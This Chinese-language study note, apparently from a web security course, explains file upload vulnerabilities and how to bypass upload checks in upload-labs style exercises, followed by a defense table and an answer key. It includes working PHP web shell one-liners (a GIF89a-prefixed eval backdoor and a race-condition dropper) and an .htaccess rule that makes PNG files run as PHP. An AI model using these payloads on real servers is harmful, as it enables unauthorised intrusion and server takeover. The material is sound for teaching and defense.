## 0. 先建立两个"课前必懂"的地基认知

这两个认知是小迪反复强调的,不懂它们后面全是死记硬背:

### 0.1 格式解析是"一对一"的 —— 为什么传了图片马还不够

**关键认知**:正常配置下,**服务器按文件后缀名决定用什么解析器**,而且是严格一对一的——`.php` 才交给 PHP 解析器执行,`.jpg` 只当图片,**jpg 不会被当 php 执行**。

所以——**你光把 php 代码藏进一张图片里(图片马)、传上去,是没用的**,因为它后缀是 `.jpg`,服务器只把它当图片显示,不会执行里面的 php 代码。

**那什么时候图片马/格式差异才能利用?** 只有当存在以下情况之一时:
- **解析错误配置**(如 `.htaccess` 把 `.png` 也当 php 解析)
- **后缀解析漏洞**(如 Nginx/IIS 解析漏洞、`.php.jpg` 这类)
- **文件包含漏洞**(用 `include` 去包含那张图片马,强制当 php 执行)

> 💡 **一句话记住**:**"能不能传上去" 和 "传上去能不能被执行" 是两件事。** 很多新手绕过了上传校验、成功传了个 `.jpg` 图片马,却发现打不开——因为没解决"执行"这一步。文件上传利用 = 绕过上传校验(传进去)+ 解决解析执行(能跑)。

### 0.2 文件上传漏洞的完整定义与攻击面

**定义**:攻击者通过上传功能,写入后门(Web Shell)、连接后门、进行权限控制的安全问题。

**漏洞可能出现在哪(不只是"代码校验逻辑")**:
- 原生代码的校验逻辑(文件内容/后缀/类型判断不严)——最常见
- **语言版本缺陷**(如低版本 PHP 的 `%00` 截断)
- **语言函数缺陷**(如 `move_uploaded_file` 的特性)
- **中间件解析漏洞**(Nginx/Apache/IIS)
- **第三方编辑器漏洞**(如富文本编辑器的上传接口)

**存储逻辑也影响利用难度**:文件存哪、存储目录给不给执行权限、是不是分站存储、是不是传 OSS——不同存储方案给攻击者不一样的挑战(详见第 3 节)。

## 2. 上传绕过手法全集(🔴 核心,对照 upload-labs 关卡)

> 核心思想和你打 xss-labs 完全一样:**先判断它用了哪种校验,再对症绕过。** 下面每种都标注"它校验什么 → 怎么绕 → 为什么能绕"。

### 2.1 前端 JS 校验绕过(最弱的防线)

**它校验什么**:用前端 JavaScript 在"文件还没上传"时就检查后缀,不合法直接弹窗拦截。

**怎么判断是前端校验**:**抓包监听,上传文件时——如果数据包还没发出去(Burp 没抓到),浏览器就已经弹"文件类型不正确",那多半是前端校验。**(因为拦截发生在浏览器本地,请求根本没到服务器)

**怎么绕(三种)**:
1. **改前端代码**:F12 删掉那段检查的 JS,或改它的允许列表。
2. **先传合法的再改包**:先选个 `.jpg`,上传时用 Burp 抓包,把文件名改回 `.php` 再放行(绕过了已经执行完的前端检查)。
3. **直接构造请求**:用 Burp 直接发上传请求,跳过浏览器前端。

> **为什么能绕**:前端校验在**用户的浏览器里**执行,而浏览器是攻击者完全可控的——改代码、改包、绕过浏览器都行。**任何只在前端做的校验都形同虚设**(和你 XSS 学的"前端校验不可信"同理)。防御:**必须在服务器端校验**。

### 2.2 MIME 类型(Content-Type)绕过

**它校验什么**:检查 HTTP 请求里的 `Content-Type` 头,如 `Content-Type: image/png`,非图片类型就拒绝。

**怎么绕**:用 Burp 抓包,把 `Content-Type` 改成 `image/png`(或 `image/jpeg`),而文件内容/后缀仍是 php。

> **为什么能绕**:`Content-Type` 是**客户端在请求里自己声明的**,服务器单纯信任它就错了——攻击者随便改。(又是"客户端可控数据不可信"这个老主题)防御:不能只看 Content-Type。

### 2.3 文件头(幻数)校验绕过

**它校验什么**:读取文件开头的**幻数(magic number)**判断真实类型——如 GIF 文件头是 `GIF89a`、PNG 是 `\x89PNG`。

**怎么绕**:在你的 php 文件内容**最前面加上对应的文件头**,如:
```
GIF89a
<?php eval($_POST[1]);?>
```
这样文件头检查看到 `GIF89a` 以为是 GIF,放行;但文件后缀若是 php(或配合解析漏洞),php 代码照样执行。

> **为什么能绕**:幻数只是文件开头几个字节,攻击者可以手动伪造。防御:幻数校验要配合后缀白名单等多重手段。

### 2.4 黑名单绕过(重点,多种玩法)

**黑名单 = 禁止某些后缀**(如禁 `.php`)。黑名单天生不可靠——总有漏网的后缀/写法。各种绕法:

#### ① 过滤不严 - 大小写绕过
**场景**:黑名单只禁了小写 `.php`,没考虑大小写。而**Windows 系统对大小写不敏感**(`.PhP` = `.php`)。
**绕过**:传 `x.PhP` / `x.pHP`。
> 原理同 xss-labs 第6关大小写绕过——过滤器只匹配了一种大小写。

#### ② 过滤不严 - 无递归删除(双写)
**场景**:黑名单把 `.php` 替换删除,但**只删一次**。
**绕过**:`x.pphphp` —— 删掉中间的 `php`,剩下的 `p`+`hp` 拼回 `php`。
> 原理同 xss-labs 第7关双写绕过——删完不回头检查。

#### ③ 等价后缀绕过
**场景**:黑名单禁了 `.php`,但没禁其他能被当 php 解析的后缀。
**绕过**:试 `.php3`、`.php4`、`.php5`、`.phtml`、`.pht`、`.phps` 等(取决于服务器配置是否解析这些)。

#### ④ 点/空格/`::$DATA` 绕过(Windows 特性)
- `x.php.`(结尾加点)、`x.php `(结尾加空格)——Windows 保存时会自动去掉结尾的点和空格,留下 `x.php`。
- `x.php::$DATA`——Windows NTFS 的数据流特性,保存后变 `x.php`。

#### ⑤ `.htaccess` 绕过(Apache 解析配置)
**场景**:能上传 `.htaccess` 文件(Apache 的目录配置文件)。
**绕过**:上传一个 `.htaccess`,内容:
```
AddType application/x-httpd-php .png
```
这行让 Apache **把该目录下的 `.png` 文件也当 php 解析**。之后你再传一个 `x.png` 图片马,它就会被当 php 执行了。
> **这正是 0.1 节说的"解析错误配置"**——你主动制造了一个让 png 被解析成 php 的配置。防御:禁止上传 `.htaccess`、关闭 `AllowOverride`。

### 2.5 `%00` 截断绕过(低版本 PHP)

**场景**:PHP < 5.3.4 等低版本,存在 `%00`(空字节)截断漏洞。
**原理**:`%00` 是字符串结束符,服务器处理路径时遇到 `%00` 就认为字符串到此结束,后面的被丢弃。

- **GET 型(自动解码一次)**:`/upload/x.php%00.jpg` —— 校验时看到的是 `.jpg`(通过白名单),但保存时 `%00` 截断,实际存成了 `x.php`。
- **POST 型(需手工解码)**:POST 传输不自动解码 `%00`,要在 Burp 里对 `%00` 做手工 URL 解码(选中 `%00` 按 Ctrl+Shift+U),让它变成真正的空字节。

> **为什么能绕**:校验的是"看起来合法的完整文件名",但保存时 `%00` 把后缀截断了,校验和保存对文件名的理解不一致。防御:升级 PHP 版本(高版本已修复)。

### 2.6 条件竞争绕过(逻辑不严)

**场景**:服务器的逻辑是"先把文件保存下来,再检查,不合法才删除"。这中间有个**时间差**——文件已经存在、但还没被删掉的那一瞬间。

**绕过**:
1. 上传一个会"自我繁殖"的 php 文件,内容:
   ```php
   <?php fputs(fopen('xiao.php','w'),'<?php eval($_REQUEST[1]);?>');?>
   ```
   (这个文件一旦被执行,就会在当前目录生成一个新的后门 `xiao.php`)
2. **不断发包上传**这个文件 + **不断发包访问**它。
3. 只要在"文件存在但还没被删除"的那一瞬间访问到它、让它执行了一次,它就生成了 `xiao.php`——而 `xiao.php` 是它自己写的,不在服务器的删除逻辑里,永久留存。

> **为什么能绕**:利用"保存→检查→删除"之间的时间窗口。防御:先检查通过再保存,别先存后删。

### 2.7 二次渲染绕过

**场景**:服务器对上传的图片做**二次渲染**(用 GD 库等重新处理一遍图片,比如压缩、改尺寸),普通图片马里的 php 代码会在渲染时被破坏掉。

**绕过**:
1. 先传一张正常图片,**下载服务器渲染后导出的图片**。
2. **对比渲染前后,找出图片里"没被改变、保留下来"的字节区域**。
3. 在那个保留区域里插入后门代码(确保它能熬过二次渲染)。
4. 配合文件包含漏洞执行这个图片后门。

> **为什么难**:二次渲染会重构图片,你得找到渲染过程不会动的"缝隙"把 payload 塞进去,技术含量较高。属于进阶手法。

### 2.8 函数缺陷绕过

**场景**:利用 `move_uploaded_file` 等函数的特性。
**绕过**:`move_uploaded_file(..., '1.php/.')` —— 结尾的 `/.` 在移动文件时会被处理掉,最终存成 `1.php`。
> 利用的是函数处理路径时的边界特性。

### 2.9 代码审计 - 数组绕过

**场景**:白盒审计发现,代码用 `save_name` 数组来拼接文件名,但对数组的处理有逻辑漏洞。
**绕过**:构造特殊的数组参数(如 `save_name[0]=x.php/`、`save_name[2]=gif`),让代码在拼接/取值时产生偏差,最终保存成 php。
> 这是白盒审计才能发现的逻辑漏洞,需要读代码分析具体逻辑。

## 3. 实战中的存储逻辑挑战(🟡 重要)

绕过了上传校验、传进去了,还要面对"**存储方案**"这关——这决定了你传上去的 Shell 能不能用:

| 存储情况 | 问题 | 能否绕过 |
|---|---|---|
| **① 存储目录无执行权限** | 上传目录被配置为不可执行 php(如只读/只当静态资源) | **绕过条件:能控制上传文件的存储目录**(把文件传到一个有执行权限的目录) |
| **② 解码还原存储** | 文件被编码后存储,解析固定(和后缀名无关) | **无法直接绕过** |
| **③ 分站存储** | 上传站(upload.xxx.com)和存储站(images.xxx.com)分离 | **看存储站的执行策略**——如果存储站不解析 php,Shell 就跑不了 |
| **④ OSS 对象存储** | 文件传到阿里云 OSS 等对象存储,有 Access 控制、Bucket 隔离 | **无法直接绕过**(OSS 只存不执行代码) |

> 💡 **这解释了 0.1 节的"传上去 ≠ 能执行"**:现代很多网站把上传文件存到**独立的、不解析代码的存储服务**(OSS、分站、CDN)上,就是为了即使你传了 Shell,它也**只能被当文件下载,不会被当代码执行**——这是防御文件上传最有效的架构手段之一。所以实战中,"存储方案"往往比"上传校验"更能卡死你。

## 4. 应用场景:去哪找文件上传点(🔴 核心,补实战手感)

对照《SRC漏洞挖掘经验》,这些是文件上传漏洞的高发位置:

1. **注册用户上传的地方**——头像、附件、资料(最常见)
2. **JS 或 API 接口里的上传代码**——前端看不到的隐藏上传接口,扒 JS 能找到
3. **后台或其他管理页面**——后台的文件管理、导入功能
4. **源码泄露或盲测文件**——通过源码泄露找到上传接口,或盲测常见路径
5. **第三方编辑器上传漏洞**——富文本编辑器(如 UEditor、KindEditor)的已知上传漏洞
6. **特定的源码审计漏洞**——白盒审计发现的上传点

> 💡 尤其第 2 点——**很多上传接口页面上没有按钮,但藏在 JS/API 里**(课程提到"JS 中构造上传页面")。扒 JS 找隐藏上传接口,是实战中的重要技巧(呼应你 xss-labs 学的"隐藏参数"思维——看不见不代表不存在)。

## 5. 把它串起来:文件上传测试思维

```
① 找上传点(§4:注册/头像/后台/JS接口/编辑器)
        ↓
② 判断它用了哪种校验(抓包看):
   ├─ 没抓到包就弹错 → 前端JS校验 → 改包/改代码绕过(§2.1)
   ├─ 看 Content-Type 校验 → 改 MIME(§2.2)
   ├─ 看文件头校验 → 加幻数 GIF89a(§2.3)
   └─ 后缀黑名单 → 大小写/双写/等价后缀/点空格/.htaccess(§2.4)
        ↓
③ 特殊场景:低版本→%00截断(§2.5);先存后删→条件竞争(§2.6);
   二次渲染→找保留区插码(§2.7)
        ↓
④ 传上去了,解决"能不能执行":(§0.1 + §3)
   ├─ 后缀是php且目录能解析 → 直接访问拿Shell ✅
   ├─ 只能传图片马 → 找解析漏洞/文件包含来执行
   └─ 存OSS/分站/无执行权限目录 → 可能跑不了,评估存储策略
        ↓
⑤ 拿到可执行的Web Shell → 用蚁剑等连接 → 控制服务器
```

## 6. 防御视角(🔴 核心,攻防对照)

| 攻击 | 正确防御 |
|---|---|
| 前端JS绕过 | **必须服务器端校验**(前端校验只是体验,不是安全) |
| MIME/文件头伪造 | 不单独信任 Content-Type/幻数,多重校验 |
| 黑名单各种绕过 | **用白名单**(只允许 jpg/png 等明确安全的后缀),白名单比黑名单可靠得多 |
| %00截断 | 升级语言版本 |
| 条件竞争 | 先检查通过再保存,不要先存后删 |
| 拿Shell执行 | **上传目录禁止执行权限 + 文件存到不解析代码的独立存储(OSS/分站)+ 文件重命名(随机名,去掉可控后缀)** |

> **一句话防御总结**:**白名单后缀 + 文件重命名 + 存储目录禁执行 + 独立存储服务**。这套组合下,即使攻击者绕过了某一层,也很难既"传进去"又"能执行"。最强的一招是架构层面的"**存储和执行分离**"——让上传的文件永远到不了能执行代码的地方。

<summary>参考答案</summary>

1. 因为正常配置下服务器按后缀名决定解析器,且一对一——`.jpg` 只当图片,不会被当 php 执行,所以图片马里的 php 代码不会运行。只有当存在"解析错误配置(如 .htaccess 让 png 当 php)、后缀解析漏洞(中间件解析漏洞)、或文件包含漏洞(用 include 强制包含执行)"时,图片马才有用。核心:传进去 ≠ 能执行。
2. 抓包监听上传——如果数据包还没发出去(Burp 没抓到),浏览器就弹"文件类型不正确",说明拦截发生在浏览器本地,是前端校验。前端校验一定能绕过,因为它在用户的浏览器里执行,而浏览器完全被攻击者控制——可以改 JS 代码、可以先传合法文件再用 Burp 改包、可以直接用 Burp 构造请求跳过浏览器。任何只在前端做的安全校验都形同虚设。
3. 因为 OSS 对象存储只负责"存文件",本身不解析/执行代码——你传上去的 php Shell 在 OSS 上只能被当文件下载,不会被当代码执行。这是架构层面的"存储与执行分离":即使攻击者绕过了所有上传校验把 Shell 传进去了,文件也到了一个永远不会执行它的地方,拿不到服务器控制权。这也是为什么实战中"存储方案"常比"上传校验"更能卡死攻击者。

</details>
